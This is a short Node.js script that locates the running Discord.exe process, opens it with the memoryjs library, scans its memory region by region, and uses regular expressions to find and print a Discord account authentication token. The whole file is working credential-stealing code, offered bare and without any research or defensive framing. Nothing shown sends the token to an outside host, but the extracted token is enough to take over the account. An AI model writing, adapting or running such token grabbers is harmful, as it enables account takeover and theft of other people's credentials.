const { getProcesses, openProcess, virtualQueryEx, readBuffer } = require("memoryjs");

let token = "";
let processName = "Discord.exe";
let processes = getProcesses();

let firstCheck = new RegExp(/ODk[a-zA-Z0-9]{21}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9-_]{38}/g);
let secondCheck = new RegExp(/ODk[a-zA-Z0-9]{21}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9-_]{107}/g);
let thirdCheck = new RegExp(/Nz[a-zA-Z0-9]{22}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9-_]{38}/g);

let procID = 0;
let found = false;

for (let i = 0; i < processes.length; i++) {
    if (processes[i].szExeFile == processName) {
        if (found == false) {
            console.log(`succesfully found ${processes[i].szExeFile} with pID ${processes[i].th32ProcessID}`);
            procID = processes[i].th32ProcessID;
            found = true;
        };
    };
};

if (found == false) {
    console.log(`could not find ${processName}`);
} else {
    console.log("getting process handle and base adres...");
    const processObject = openProcess(procID);
    console.log(`succesfully retrieved handle ${processObject.handle} and base adres ${processObject.modBaseAddr}`);
    console.log("searching token in memory...")

    console.time("Found token in");
    
    let addr = 0;
    while (true) {
        try {
            let query = virtualQueryEx(processObject.handle, addr);
            let string = readBuffer(processObject.handle, addr, query.RegionSize).toString();
    
            let fToken = firstCheck.exec(string);
            let sToken = secondCheck.exec(string);
            let tToken = thirdCheck.exec(string);
    
            if (fToken) {
                token = fToken[0];
                break;
            } else if (sToken) {
                token = sToken[0];
                break;
            } else if (tToken) {
                token = tToken[0];
                break;
            };
    
            addr = query.BaseAddress + query.RegionSize;
        } catch (err) {
            console.log("could not find token in memory");
            break;
        };
    };

    if (token.length == 0) {
        console.log("could not find token in memory");
    } else {
        console.log("token: " + token);
        console.timeEnd("Found token in");
    };
};